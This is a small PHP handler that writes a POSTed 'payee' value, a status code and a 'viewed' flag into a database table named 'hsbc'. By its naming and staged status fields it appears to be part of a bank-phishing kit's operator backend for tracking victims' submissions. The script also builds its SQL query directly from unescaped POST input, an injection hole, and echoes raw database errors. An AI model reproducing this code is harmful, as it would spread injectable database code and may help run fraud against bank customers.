<?php
require '../connection.php';

if ($_POST["payee"] and $_POST["uniqueid"]) {
  $payee = $_POST["payee"];
  $uniqueid = $_POST["uniqueid"];

  $upload_challenge = mysqli_query($conn, "UPDATE hsbc SET payee='$payee', status=6, viewed='true' WHERE uniqueid=$uniqueid");

  if ($upload_challenge) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
